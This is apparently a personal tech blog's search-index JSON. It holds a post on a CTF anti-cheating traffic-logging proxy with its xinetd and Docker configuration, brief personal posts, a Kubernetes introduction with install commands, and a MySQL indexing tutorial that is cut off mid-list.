[{"title":"CTF大赛中很实用的防止PY工具","url":"/2022/05/13/security/ctf/avoid-ctf-py/","content":"avoid-ctf-py仓库地址：https://github.com/i0gan/ctf-avoid-py\nCTF大赛中很实用的防止PY工具，国内的PY现象一个日渐泛滥，在这种趋势下，想要赛选出真正有实力的选手还得看举办方的一个比赛规则的规定，也是举办方与参赛选手的一种对抗。再此呢，我开发了skyaf工具，在CTF PWN中十抓九准！曾经实践于2021安洵杯所有pwn题中，由于防止引起大家的煽动，当时没有公布筛选结果出来，大家有兴趣的话，可以看一下当时的流量抓取情况，在traffic目录下。\n我也是本来想把这款软件技术写份专利的，但没有时间去搞这玩意儿，知识是拿来分享的，藏着也不行。我呢，目前也逐渐从CTF离开了，就把他公布出来吧，拯救一下国内严重泛滥的PY现象吧。自己之前写过选手博弈举办方的工具，比如pwn_waf，当然也配套有AWD批量攻击脚本 awd_script，这两个工具在打ctf awd模式的时候就爽歪歪了，除了安恒举办的awd plus。\n原理skyaf工具的思想是源自于我之前写了pwn_waf流量抓取工具中的转发模式。在docker内部网络中采用tcp非阻塞select进行转发了一下，并且对数据进行了日志写入。采用动态输入token，能够有一定程度防止PY。\n选手连接过程：\n选手 -&gt; docker -&gt; xinitd -&gt; skyaf -&gt; xinitd -&gt; pwn\n\n看着有点长，其实真正缩短起来，可以忽略docker和xinitd。\n选手-&gt;skyaf-&gt;pwn\n\nskyaf是作为选手和pwn服务的中介，传输的数据都要经过skyaf，这样skyaf只需吧数据记录下来就可以了。\nskyaf不止是进行流量日志记录，且skyaf要求输入参数选手的账号以及选手的名字，若打通了之后，也加入了动态token验证，通过输入正确的token，才能获取正确的flag。\n编译skyaf进入到skyaf目录下，输入以下命令\nmake\n\n这样就会在当前目录下编译出了skyaf。\n如何使用skyaf？基于所给的例子来改我也给了个例子，在examples/configure/pwnsky/docker/下，着重看一下ctf.xinetd文件和skyaf.xinetd。这两个文件是xinetd服务的配置文件，相当于一个nginx的CGI一样。将二进制程序的标准IO映射成一个网络端口。ctf.xinetd文件基本就不用改，如下：\nctf.xinetd\nservice ctf&#123;    disable = no    socket_type = stream    protocol    = tcp    wait        = no    user        = root    type        = UNLISTED    port        = 8080    bind        = 0.0.0.0    server      = /usr/sbin/chroot       server_args = --userspec=1000:1000 /home/ctf /pwn    # safety options    per_source  = 5 # the maximum instances of this service per source IP address    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use    rlimit_as  = 100M # the Address Space resource limit for the service    #access_times = 8:50-17:10&#125;\n\nskyaf.xinetd文件呢，主要包含了个flag信息，其他的也可以不用改，更换flag的话就改这个配置文件。\nservice skyaf&#123;    disable = no    socket_type = stream    protocol    = tcp    wait        = no    user        = root    type        = UNLISTED    port        = 80    bind        = 0.0.0.0    server      = /skyaf    server_args = 127.0.0.1 8080 /home/ctf/sky_token d0g3&#123;f2f82dc8faa12b715d90ff8f205a4cf6&#125;    # safety options    per_source  = 5 # the maximum instances of this service per source IP address    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use    rlimit_as  = 100M # the Address Space resource limit for the service    #access_times = 8:50-17:10&#125;\n\n然后替换一下&#x2F;home&#x2F;ctf&#x2F;pwn为你的附件就ok啦。\n基于自己的docker文件来增加skyaf添加\nservice skyaf&#123;    disable = no    socket_type = stream    protocol    = tcp    wait        = no    user        = root    type        = UNLISTED    port        = 80    bind        = 0.0.0.0    server      = /skyaf    server_args = 127.0.0.1 8080 /home/ctf/sky_token d0g3&#123;f2f82dc8faa12b715d90ff8f205a4cf6&#125;    # safety options    per_source  = 5 # the maximum instances of this service per source IP address    rlimit_cpu  = 20 # the maximum number of CPU seconds that the service may use    rlimit_as  = 100M # the Address Space resource limit for the service    #access_times = 8:50-17:10&#125;\n\nskyaf.xinetd文件呢，把d0g3&#123;f2f82dc8faa12b715d90ff8f205a4cf6&#125; 改成你的flag，主要包含了个flag信息，其他的也可以不用改，更换flag的话就改这个配置文件。将编译好skyaf文件复制到docker文件目录下，且赋予可执行权限。\n修改你自己的ctf.xinetd配置文件中的端口为8080，然后在docker启动容器的时候，将其内部的80映射为外部其他端口即可。比如说，我写了个docker-compose.yml\nversion: &#x27;3&#x27;services:  axb_awd_pwn_runner:    image: axb_pwn_pwnsky    build: .    container_name: con_axb_pwn_pwnsky    ports:      - 20135:80\n\n穿透出去的也就是20135端口了，外部通过访问 20135就可以访问该题了。\n如何对skyaf已抓取到日志流量进行审计？这里给的例子是，2021安洵杯比赛中所抓取到的日志流量，在examples&#x2F;traffic&#x2F;axb2021&#x2F;unziped&#x2F;下，该目录下是解压过以及处理过的，向获取未处理过的文件，请查看examples&#x2F;traffic&#x2F;axb2021&#x2F;zip_download&#x2F; 目录下的文件。\n抓取到的日志流量都比较多，采用一定手段将其无用的日志文件筛选掉。\n\n筛选提交正确flag的日志文件\n根据大小排序，依次人工审计流量 【当然这里也有别人采用文件对比的方式进行筛选，但我感觉人工审计比较准确一些】\n\n筛选出提交正确的日志文件一下命令是需要进入到出现一大批日志文件的目录。\n赛选出统计提交对日志文件的总数\nfind . | xargs grep -i &quot;right&quot; | wc -l\n\n赛选出提交对的日志文件，并移动到 data目录下\nmkdir -p data &amp;&amp; find . | xargs grep  -l &quot;right&quot; 2&gt;0 | xargs -i cp -L &#123;&#125; ./data\n\n进入到筛选出来提交正确的日志目录，在电脑上采用文件大小进行排序，然后两两依次向后对比，主要对比就是所交互的逻辑以及所交互的数据。\n判断依据堆栈题型：一般堆栈题型都逻辑，交互逻辑都比较单一，主要对比的是 数据内容，ip地址，提交时间，来进行综合判断。\n堆类型：堆类型一般exp交互过程比较多，主要是先对比交互逻辑，依次是数据内容，ip地址，提交时间。\n其他类型：其他类型的题也都差不多，从4个点进行对比：交互逻辑、数据内容、ip地址、提交时间。\n","categories":["security"],"tags":["ctf"]},{"title":"My motor career","url":"/2023/05/20/life/hobby/motor/","content":"My motor career","categories":["life"],"tags":["motor"]},{"title":"My car career","url":"/2023/05/20/life/hobby/car/","content":"我非常的喜欢车，我自己从小就很喜欢玩赛车类的游戏，也非常喜欢小汽车类的玩具。直到了大二上学期，刚满18岁，考了驾照，自己才第一次买了属于自己的车。\n自己的Dreme Car是丰田86，不管是GT还是GR系列的，都非常喜欢，也希望自己有招一日能去贵阳的高坡参加爬坡赛。\n吉利-自由舰 2011\n雪铁龙-凯旋 2008\n","categories":["life"],"tags":["car"]},{"title":"To explore the world","url":"/2023/05/20/life/world/explore_wolrd/","content":"To explore the world","categories":["life"],"tags":["world"]},{"url":"/2023/05/20/life/ic/friend/","content":"我的朋友"},{"url":"/2023/05/20/life/school/about/","content":""},{"title":"K8s入坟","url":"/2023/03/15/dev/k8s/k8s/","content":"K8s入坟1.概述Kubernetes，也被称为K8s或Kube，是谷歌推出的业界最受欢迎的容器编排器。本K8s教程由一系列关于K8s的文章组成。在第一部分，我们将讨论什么是K8s和K8s的基本概念。\n2.什么是容器引擎?容器引擎允许你绑定和运行一个应用在一个容器里，这是一个松散隔离的环境。由于隔离性和安全性，你可以在一台主机上操作多个容器。\n容器引擎利用了操作系统的内核资源隔离特性，可以在同一个操作系统上运行多个容器。人们通常把容器引擎比作虚拟机(VMs)。\n另一方面，虚拟机利用物理硬件资源抽象层之上可执行代码封装了整个操作系统。\n3.什么是容器?一个容器镜像是一个可运行的软件包，其中包含了一个完整的可执行程序，包括代码和运行时需要应用、系统库和全部重要设置的默认值。\n应用程序通过使用容器与底层的宿主机架构解耦。如下图所示，我们可以利用底层机器在容器引擎之上运行多个容器。这促进了容器在各种操作系统和云场景中的部署。\n\n容器通过容易扩展和部署应用程序的特性帮助企业实现现代化。然而，重新建立一个全新的基础环境，容器也带来了额外的问题和复杂性。每天有数千个容器实例被大型和小型软件组织部署，这给他们的管理带来了持续增长的挑战。那么，他们是如何做到的呢?\n4.什么是容器编排?容器编排与容器的生命周期管理相关，特别是在大型动态环境中。软件团队用容器编排器来控制和自动化容器管理的各种任务。容器编排器可以工作在使用容器的任何环境。它可以帮助你在多个环境中部署相同的程序，而不需要重新编写它。\n5.容器编排工具容器编排技术提供了一个控制容器和微服架构的框架。容器生命周期管理可以通过各种容器编排器解决方案来实现，Kubernetes、Docker Swarm和Apache Mesos是三种常见的解决方案&#x2F;编排工具。Docker Swarm是Docker原生工具，非常容易安装和配置。K8s需要大量手工干预来配置其组件，例如 etcd、flannel 和 docker 引擎。与其他工具相比，K8s凭借其各种优势和功能特性在行业占据主导地位。\n6.什么是K8s?K8s是一个最初由Google开发的，用于自动化部署、扩展和管理容器化应用的开源容器编排器技术。K8s使部署和管理微服务架构应用程序变得很简单。它通过在集群之上形成一个抽象层来实现这一点，允许开发团队平滑地部署应用程序，而 K8s主要处理以下任务：\n\n控制和管理应用程序对资源的使用\n自动负载均衡应用程序的多个实例之间请求\n监控资源使用和资源限制，为了可以自动阻止应用消耗过多的资源并且可以再次恢复它们\n如果主机资源耗尽或主机死机，将应用程序实例从一台主机迁移到另一台主机是一个可行的选项\n当有新的主机加入集群时，新增加的额外资源可以被自动使用\n\n7.为什么市场推荐K8sK8s是第一个由云原生计算基金会(Cloud Native Computing Foundation, CNCF)和谷歌基金会倡议的项目，是继Linux之后增长最快的开源软件项目。\n为什么现在有很多企业依赖K8s来满足他们的容器编排需求? 原因有很多:\n\n可移植性和灵活性：K8s有很强的兼容性，因为它可以在各种基础设施和环境设置下运行。大多数其他编排器没有这种灵活性。它们被锁定在特定的运行时或基础架构中。\n开源：CNCF负责管理K8s，这是一个完全开源、由社区驱动的项目。它有许多重要的企业赞助商，但没有一家公司能“控制”这个平台或者控制它的发展方向。\n多云兼容性：K8s不但可以将工作负载托管在单个云上，而且可以将工作负载分布在多个云上。 K8s也能轻松地将其环境从一个云扩展到另一个云。虽然其它编排器也能支持多云架构，但K8s在多云兼容性性方面可以完全超越它们。\n市场领导者：大部分公司都在使用K8s。根据红帽公司的一项调查，K8s被客户广泛使用 (88%)，尤其在生产环境中(74%)。\n\n8.K8s架构K8s是一个架构良好的分布式系统的例子。它将集群中的所有机器都视为单个资源池的一部分。\nK8s与其他成熟的分布式系统一样，有两层：头节点和工作节点。\n头节点或主节点由控制面和工作节点应用程序组成。一个K8s集群由许多头节点和工作节点组成。\n\nK8s引入了很多术语来描述应用程序的结构。 我们将带大家学习每个术语。\n9.K8s组件头节点&#x2F;主节点和工作节点由它自己的组件组成，可以确保编排器稳定地运行。\n控制平面控制平面是管理员和用户管理不同节点的地方。它通过HTTP调用接收命令或者连接到系统并且运行命令行脚本。顾名思义，它控制了K8s与应用程序的交互方式。\nAPI 服务器API 服务器为K8s集群提供了一个REST接口。 所有在pod上激活的服务和别的对象都是可以用可编程的方式与与终端进行交互。\n调度器调度器负责将任务分配给各个节点。它监控资源容量并保证工作节点的性能保持在可接受的范围内。\n控制器管理器K8s控制器管理器是管理K8s核心控制循环的服务。它负责确保集群的共享状态正常运行。\nEtcdK8s使用了Etcd，一个提供分布式键值存储的数据库，用来共享集群的整体状态的信息。\n节点节点是运行了pod的物理机或虚拟机。控制平面管理集群中的每个节点，该节点包含运行 pod所需的服务。\nPodsK8s pod 是K8s管理容器集的最小单位。 每个pod有一个分配给pod中的所有容器的单独的IP 地址。在pod中的容器内存和存储资源是共享的。当应用程序只有一个进程时，pod 也可以有一个容器。\nKubeletKubelet是一个工作节点组件。它的任务是跟踪pod及其容器的运行状态。它与pod的YAML 或JSON描述文件相关。Kubelet检查 pod 规格并确定 pod 是否健康。\nKube代理Kube代理是一个网络代理和负载均衡器，充当每个节点和API服务器之间的连接。它在集群中的每个节点上运行，并允许你从内部和外部连接到pod。\nKubectlKubectl是K8s的命令行工具。它用于部署应用程序、监控和控制集群资源以及查看日志。\n从用户的角度来看，Kubectl 是你的K8s的控制面板。它使你能够执行所有K8s操作。从技术角度来看，Kubectl 是K8s API的客户端。\n结论在本文中，我们已经了解了容器编排的基本概念和K8s的架构。在我们即将发表的文章中，我们将了解K8s的重要关键特性和单节点K8s安装\nref: https://baijiahao.baidu.com/s?id=1730956371994388279&amp;wfr=spider&amp;for=pc\nk8s安装先安装Docker\n```在/etc/dockerdemon.json\n{“registry-mirrors” : [“https://nvq2froz.mirror.aliyuncs.com&quot;,“https://dockerhub.azk8s.cn&quot;,“https://reg-mirror.qiniu.com&quot;,“https://quay-mirror.qiniu.com&quot;,“https://1nj0zren.mirror.aliyuncs.com&quot;],“insecure-registries” : [“192.168.130.236:6000”],“exec-opts”: [“native.cgroupdriver&#x3D;systemd”]}\n### Centos配置k8s源\ncat &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;kubernetes.repo &lt;&lt; EOF[kubernetes]name&#x3D;Kubernetesbaseurl&#x3D;https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled&#x3D;1gpgcheck&#x3D;0repo_gpgcheck&#x3D;0gpgkey&#x3D;https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF\n安装kubeadm，kubelet，kubectl，并且指定版本，因为1.24的版本默认运行时环境不是docker了\nyum install -y kubelet-1.23.6 kubeadm-1.23.6 kubectl-1.23.6\n设置开机自启，因为kubelet是k8s在node节点上的代理，必须开机要运行的\nsystemctl enable kubelet\n部署kubernetes master\n## Ubuntu1.使得 apt 支持 ssl 传输\napt-get update &amp;&amp; apt-get install -y apt-transport-https\n2.下载 gpg 密钥\ncurl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add -\n3.添加 k8s 镜像源\ncat &lt;&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.listdeb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial mainEOF\n4.更新源列表\napt-get update\n5.安装 kubectl，kubeadm以及 kubelet\napt-get install -y kubelet kubeadm kubectl\n注意: 直接在/etc/apt/sources.list里添加https://mirrors.aliyun.com/kubernetes/apt/ 是不行的，因为这个阿里镜像站使用的ssl进行传输的，所以要先安装apt-transport-https并下载镜像站的密钥才可以进行下载6.运行systemctl start命令启动kubelet服务,并设置为开机自动启动\nsystemctl start kubeletsystemctl enable kubelet\nref：https://blog.csdn.net/m0_60028455/article/details/125783685ref: https://blog.csdn.net/qq_48391148/article/details/127017827github: https://github.com/kubernetes/kubernetes##### You have a working [Go environment](https://go.dev/doc/install).\nmkdir -p $GOPATH&#x2F;src&#x2F;k8s.iocd $GOPATH&#x2F;src&#x2F;k8s.iogit clone https://github.com/kubernetes/kubernetescd kubernetesmake\n##### You have a working [Docker environment](https://docs.docker.com/engine).\ngit clone https://github.com/kubernetes/kubernetescd kubernetesmake quick-release\n\n\n","categories":["dev"],"tags":["k8s"]},{"title":"Mysql索引","url":"/2023/03/15/dev/db/mysql/mysql-index/","content":"Mysql 索引索引介绍\n索引是个什么东西？\n可以创建哪些索引？\n哪些字段适合建立索引呢？\n索引是不是越多越好呢？\n为什么不建议使用uuid、身份证号等数据做为主键？\n为什么不建议使用select * from table？\n使用模糊匹配 ’%三‘ ’张%‘ 在前在后会影响索引的使用吗？\n\n什么是索引在关系数据库中，索引是一种单独的、物理的对数据库表中一列或多列的值进行排序的一种存储结构，它是某个表中一列或若干列值的集合和相应的指向表中物理标识这些值的数据页的逻辑指针清单。索引的作用相当于图书的目录，可以根据目录中的页码快速找到所需的内容。\n\nmysql中索引有哪些类型普通索引通索引是mysql里最基本的索引，没有什么特殊性，在任何一列上都能进行创建。\n-- 创建索引的基本语法CREATE INDEX indexName ON table(column(length));-- 例子 length默认我们可以忽略CREATE INDEX idx_name ON user(name);\n\n主键索引我们知道每张表一般都会有自己的主键，mysql会在主键上建立一个索引，这就是主键索引。主键是具有唯一性并且不允许为NULL，所以他是一种特殊的唯一索引。一般在建立表的时候选定。\n复合索引复合索引也叫组合索引，指的是我们在建立索引的时候使用多个字段，例如同时使用身份证和手机号建立索引，同样的可以建立为普通索引或者是唯一索引。\n复合索引的使用复合最左原则。举个例子 我们使用 phone和name创建索引。\n-- 创建索引的基本语法CREATE  INDEX indexName ON table(column1(length),column2(length));-- 例子 CREATE INDEX idx_phone_name ON user(phone,name);\n\n我们看下面的查询语句，\nSELECT * FROM user_innodb where name = &#x27;程冯冯&#x27;;SELECT * FROM user_innodb where phone = &#x27;15100046637&#x27;;SELECT * FROM user_innodb where phone = &#x27;15100046637&#x27; and name = &#x27;程冯冯&#x27;;SELECT * FROM user_innodb where name = &#x27;程冯冯&#x27; and phone = &#x27;15100046637&#x27;;\n\n三条sql只有 2 、 3、4能使用的到索引idx_phone_name,因为条件里面必须包含索引前面的字段才能够进行匹配。而3和4相比where条件的顺序不一样，为什么4可以用到索引呢？是因为mysql本身就有一层sql优化，他会根据sql来识别出来该用哪个索引，我们可以理解为3和4在mysql眼中是等价的。\n全文索引全文索引主要用来查找文本中的关键字，而不是直接与索引中的值相比较。fulltext索引跟其它索引大不相同，它更像是一个搜索引擎，而不是简单的where语句的参数匹配。fulltext索引配合match against操作使用，而不是一般的where语句加like。\n它可以在create table，alter table ，create index使用，不过目前只有char、varchar，text 列上可以创建全文索引。正常情况下我们也不会使用到全文索引，因为这不是mysql的专长。\n空间索引空间索引是对空间数据类型的字段建立的索引，MYSQL中的空间数据类型有4种，分别是GEOMETRY、POINT、LINESTRING、POLYGON。MYSQL使用SPATIAL关键字进行扩展，使得能够用于创建正规索引类型的语法创建空间索引。\n创建空间索引的列，必须将其声明为NOT NULL，空间索引只能在存储引擎为MYISAM的表中创建。空间索引一般是用不到了，了解即可。\n索引的数据结构B+Treeinnodb默认索引数据结构是B+Tree，什么是B+Tree呢，它的全名叫做平衡多路查找树PLUS。他是由平衡二叉树查找树（AVL树）演化而来。我们来介绍一下他的演化史（敲黑板，必考题）。\n我们上面讲到，索引是一种有序的数据结构，因为有序才能快速的进行查找，所以我们一步步看一下索引的定型演化，首先我们讲一下什么是二叉查找树。\n二叉查找树（Binary Search Trees）二叉树查找树具有以下性质：左子树的键值小于根的键值，右子树的键值大于根的键值。\n\n 节点的顺序就是11、25、36、80、110、120、300。他的问题是不够稳定，上图我们看到了这是最好的一种情况，插入顺序是80、25、11、36、120、110、300，但是如果我们的插入顺序变成11、25、36、80、110、120、300，那么他的树结构会变成下图这样。\n\n上图好好的一个二叉树变成了一个链表。之前我们查找到300需要3次查询，后者则需要7次效率是直线下降。\n这里可以去这个网址Data StructureVisualizations自己去操作下这个流程。\nhttps://www.cs.usfca.edu/~galles/visualization/Algorithms.html \n\n那么如何解决掉这种不平衡的问题呢？\nAVL Trees (Balanced binary search trees)这个时候平衡二叉查找树出现了。什么是AVL树，在计算机科学中，AVL树是最先发明的自平衡二叉查找树。在AVL树中任何节点的两个子树的高度最大差别为1，所以它也被称为高度平衡树。增加和删除可能需要通过一次或多次树旋转来重新平衡这个树。\nAVL树得名于它的发明者G. M. Adelson-Velsky和E. M. Landis，名字已拼接AVL树的大名就出来了。我们下面看下avl按照11、25、36、80、110、120、300顺序进行插入的效果图。\n\n当子树的高度超过1时他会通过自旋的方式重新平衡树，所以这样我们查询数据的时间复杂度就稳定了。有关avl树是怎样进行旋转平衡的这里就不概述了。\n那么，我们使用AVL树作为索引是不是就可以了呢，答案是否定的。我们的索引是存储到磁盘上的，每次进行数据查询会将磁盘里的数据读取到内存中，对磁盘io是非常耗时的，而内存操作非常快。计算机的最小存储单元是块（block）默认4k大小，读取数据是一块一块读取的，而不是随意的读取1&#x2F;2块数据，对应的我们mysql存储数据也是已页（page）为单位进行存储，默认为16K（16384B），mysql在读取的时候也是一页一页读取的。\n--下面的这个命令就是查询page大小MYSQL&gt; show variables like &#x27;innodb_page_size&#x27;;\n\n\n如果使用AVL树，我们的一个节点就是一页，但是一个节点是16k啊兄弟们，一页就放一个节点肯定是太浪费空间了，而且如果有1000w的数据，那么二叉树深度是55，我们要查找一个数据io的次数就有点太多了，显然这样是不合理的，我们可以怎么做呢？\nB-Tree(读作 b树 不是b减树)为了解决AVL浪费磁盘空间以及IO次数过多的问题，我们在一个节点中多存储一些数据，之前我们放一个，现在我们放多个。如果放int值（4B）我们近乎可以放4096个值，当然索引里面还包含其他的数据，不能够放这么多，但是这也是足够的多了。\n这样一个节点的值多了那么树的分叉肯定就多了，假如一个节点可以存储1000的值，那么1000 * 1000 * 1000 &#x3D; 10亿节点，3层的结构就能存储10亿的数据，这样是不是最多IO3次就足够了呢。\n所以AVL的进化体B-Tree出现了，B-Tree的全名是多路平衡查找树，B-tree中，每个结点包含：\n\n本结点所含关键字的个数；\n指向父结点的指针；\n关键字；\n指向子结点的指针；\n\n对于一棵m阶B-tree，每个结点至多可以拥有m个子结点。各结点的关键字和可以拥有的子结点数都有限制，规定m阶B-tree中，根结点至少有2个子结点，除非根结点为叶子节点，相应的，根结点中关键字的个数为1~m-1 ；非根结点至少有[m&#x2F;2]（[]，向上取整）个子结点，相应的，关键字个数为[m&#x2F;2]-1 ~ m-1。\n\nB-Tree的度是可以设置的，上面截图我设置的度为3（达到3即进行分裂），真正索引度就比较大了，一般度的大小会根据索引列的类型进行变更。大家利用好这个网站Data StructureVisualizations，自己多做一些模拟会理解的更加深刻。\n说到这里我们越来越接近真相了，我们mysql索引的数据结构到底是不是B-Tree呢？\n这就需要说道mysql设计的另外一个概念了——聚集索引和辅助索引。\n聚集索引和辅助索引（非聚集索引）什么是聚集索引（clustered index organize table ），聚集索引中键值的逻辑顺序和表中相应行的物理顺序相同。\n聚集索引类似于电话簿，后者按姓氏排列数据。由于聚集索引规定数据在表中的物理存储顺序，因此一个表只能包含一个聚集索引。但该索引可以包含多个列（联合索引），就像电话簿按姓氏和名字进行组织一样，但是在innodb的设计中聚集索引包含整行的数据，所以innodb中索引就是数据本身，这就是大家常说的索引即数据。\n官方解释聚集索引:\n\nEvery InnoDB table has a special index called the clustered index where the data for the rows is stored. Typically, the clustered index is synonymous with the primary key.\n\n每个InnoDB表都有一个特殊的索引，称为聚簇索引 ，用于存储行数据。通常，聚簇索引与主键同义 。\n非聚集索引的话其实就是一个普通索引，但是非聚集索引不存储全部数据，只存储聚集索引的值（一般为主键id）。\n所以我们如果使用B-Tree来作为索引结构的话，如果数据行过大，那么一个页存储的数据就会大大减少，这就违背了我们B-Tree的初衷了——在一个页中尽可能的存储多的数据。像前面说的如果我们存储int类型可以存储几千个，那么如果我们存储整行数据呢，可能只能存储三四个，那么树的深度就会大大增加，而且我们的内存空间是有限的，每次mysql预读进来的索引数量有限，这进一步导致搜索效率变差。\n所以我们想要的索引就是只包含索引字段，不应该包含全部的数据 ，看下面的对比图。\n\n好了，该主角出场了。\nB+Tree为了解决只存储索引的问题，B-Tree的plus版本横空出世，那就是B+树。\nB+ 树是一种树数据结构，是一个n叉树，每个节点通常有多个孩子，一颗B+树包含根节点、内部节点和叶子节点，和B-Tree几乎一样，只不过B+Tree不再包含整行的数据了。B+ 树通常用于数据库和操作系统的文件系统中。B+ 树的特点是能够保持数据稳定有序，其插入与修改拥有较稳定的对数时间复杂度。B+ 树元素自底向上插入。\n一个m阶的B树具有如下几个特征：\n\n根结点至少有两个子女。\n每个中间节点都至少包含ceil(m &#x2F; 2)个孩子，最多有m个孩子。\n每一个叶子节点都包含k-1个元素，其中 m&#x2F;2 &lt;&#x3D; k &lt;&#x3D; m。\n所有的叶子结点都位于同一层。\n每个节点中的元素从小到大排列，节点当中k-1个元素正好是k个孩子包含的元素的值域分划。\n\n下面是一个简单的展示图，让大家了解B+Tree的数据结构。相对于B-Tree最大的变化有三点：\n\n数据下移，所有的非叶子节点不再存储数据而将数据全部存储到叶子节点。\n所有的叶子节点都有一个双向的指针，做了一个双向链表\n使用B+Tree查询次数相对固定，因为数据都在叶子节点，每一个层级都会被加载扫描。\n\n\n还有一点为什么使用B+Tree呢，因为mysql查询路径的选择是根据cost（cost &#x3D; cpu cost + io cost）计算的，因为索引的查询次数固定，所以io cost计算中他就可以直接舍去了，减轻了myslq的计算量。具体cost的计算不在本篇文章展开。\n\ncpu cost：server层对返回的记录数的compare时间。\nio cost：引擎层根据扫描记录的记录数计算cost。\n\n另外需要补充的一点，我们已经了解到了innodb引擎中数据和索引是在一起的，而myisam引擎数据和索引是分开的，这个我们可以直接查看本地文件可以看到。\nMYSQL&gt; show variables like &#x27;datadir&#x27;;\n\n上面的命令可以让你看到mysql的库文件存储位置。\n\n以我本机为例，user_innodb表的存储引擎是innodb，他有两个文件.frm（表描述文件）和.ibd（索引和数据文件）.\nuser_myisam表的存储引擎是myisam，他会有三个文件.MYD（数据文件）、.MYI（索引文件）和.frm（表描述文件）。MYD其中D就是data的意思I就是index的意思这样就记住了。ibd猜测下 index + B+Tree + data…。\nMYSIAM引擎的索引文件持有的是数据文件的地址引用。\nMYSIAM和Innodb的索引区别：\n\ninnodb数据和索引在一起（数据即索引，索引即数据），而mysiam是分开存储的\ninnodb索引是有主次的，也就是区分聚集索引和非聚集索引。而mysiam是不区分主次的。\n\n非聚集索引是怎么查找数据的上面我们已经了解了聚集索引（一般是主键索引）是如何获取的，那非聚集索引呢？下面我们看一张图。\n\n从这个图我们就可以直观的看到，非聚集索引是怎么查询数据的。每次查非聚集索引都会再次通过主键再次去聚集索引里面查询。\n这里我们再引申出一个概念那就是回表，我们上图所描述的流程就是回表。回表的原因是我们需要获取的是整行或者是包含非索引字段的数据，因非聚集索引没有该字段所以需要回表查询。\n因此我们建议尽量少用SELECT * FROM TABLE,例如我们查询SELECT * FROM USER WHERE name LIKE &#39;张%&#39;，但是我们其实想要的只是名字的集合而已，那么我们就可以改造成SELECT name FROM USER WHERE name LIKE &#39;张%&#39;,前者会回表查询而后者不会，这应就减少了数据查询的时间同时也减少了数据库的压力。\nHASH索引Hash索引就是将索引字段进行hash存储，整个hash索引的结构是Hash表+链表（因为会存在hash冲突）。\n不知道大家有没有碰到过这么一种情况，我们在给数据库创建索引的时候选择了HASH但是创建完成后会默认的给我们改成B+Tree索引！没碰到的小伙伴自己去试一下看看是不是这样。\n翻了一下官网找到这么一个图。\n\n InnoDB和MyISAM竟然不支持创建HASH索引。\n\n行了，这下次一巴掌打的脑瓜子嗡嗡的,只有MEMORY&#x2F;NDB才能够创建Hash索引。\n那InnoDB里有Hash索引吗？\nHash索引在InnoDB中的使用在官网的InnoDB架构中有这么一张图。\n\n 在我们Buffer Pool中有个Adaptive Hash Index（自适应hash索引）。官网是这么介绍的。\n\nThe adaptive hash index feature enables InnoDB to perform more like an in-memory database on systems with appropriate combinations of workload and sufficient memory for the buffer pool without sacrificing transactional features or reliability. The adaptive hash index feature is enabled by the innodb_adaptive_hash_index variable, or turned off at server startup by –skip-innodb-adaptive-hash-index. Based on the observed pattern of searches, a hash index is built using a prefix of the index key. The prefix can be any length, and it may be that only some values in the B-tree appear in the hash index. Hash indexes are built on demand for the pages of the index that are accessed often. If a table fits almost entirely in main memory, a hash index can speed up queries by enabling direct lookup of any element, turning the index value into a sort of pointer. InnoDB has a mechanism that monitors index searches. If InnoDB notices that queries could benefit from building a hash index, it does so automatically. With some workloads, the speedup from hash index lookups greatly outweighs the extra work to monitor index lookups and maintain the hash index structure. Access to the adaptive hash index can sometimes become a source of contention under heavy workloads, such as multiple concurrent joins. Queries with LIKE operators and % wildcards also tend not to benefit. For workloads that do not benefit from the adaptive hash index feature, turning it off reduces unnecessary performance overhead. Because it is difficult to predict in advance whether the adaptive hash index feature is appropriate for a particular system and workload, consider running benchmarks with it enabled and disabled. Architectural changes in MySQL 5.6 make it more suitable to disable the adaptive hash index feature than in earlier releases.\n\n他说自适应哈希索引可以在InnoDB不牺牲事务功能或可靠性的情况下创建，但是他的使用范围就是Buffer Pool，那么最终这个hash索引仍然只是一个内存索引。而我们B+Tree索引是存储在磁盘的，一般只有跟节点常驻内存。推荐：250期面试题汇总\n是否使用自适应hash索引由参数innodb_adaptive_hash_index控制，具体:\n\nhttps://dev.mysql.com/doc/refman/5.7/en/innodb-parameters.html#sysvar_innodb_adaptive_hash_index\n\nHash索引的优缺点由于Hash是基于内存的索引，那么他的检索效率是非常快的，那既然Hash索引效率这个高，我们是不是都需用Hash索引啊。\n我觉得hash索引的优点只有一个，那就是快，不需要磁盘io，直接内存一次性搞定。但是要说他的缺点可真的是太多了。\n\nHash索引仅仅能满足”&#x3D;”,“IN”和”&lt;&#x3D;&gt;”查询，不能使用范围查询。 哈希索引只支持等值比较查询，包括＝、 IN 、&lt;&#x3D;&gt; (注意&lt;&gt;和＜＝＞是不同的操作）。也不支持任何范围查询，例如WHERE price &gt; 100。\n由于Hash索引比较的是进行Hash运算之后的Hash值 ，所以它只能用于等值的过滤，不能用于基于范围的过滤，因为经过相应的Hash算法处理之后的Hash值的大小关系，并不能保证和Hash运算前完全一样。\nHash索引无法被用来避免数据的排序操作。 由于Hash索引中存放的是经过Hash计算之后的Hash值，而且Hash值的大小关系并不一定和Hash运算前的键值完全一样，所以数据库无法利用索引的数据来避免任何排序运算;\nHash索引不能利用部分索引键查询。 对于组合索引，Hash索引在计算Hash值的时候是组合索引键合并后再一起计算Hash值，而不是单独计算Hash值，所以通过组合索引的前面一个或几个索引键进行查询的时候，Hash索引也无法被利用。\nHash索引在任何时候都不能避免表扫描。 前面已经知道，Hash索引是将索引键通过Hash运算之后，将 Hash运算结果的Hash值和所对应的行指针信息存放于一个Hash表中，由于不同索引键存在相同Hash值，所以即使取满足某个Hash键值的数据的记录条数，也无法从Hash索引中直接完成查询，还是要通过访问表中的实际数据进行相应的比较，并得到相应的结果。\nHash索引遇到大量Hash值相等的情况后性能并不一定就会比BTree索引高。 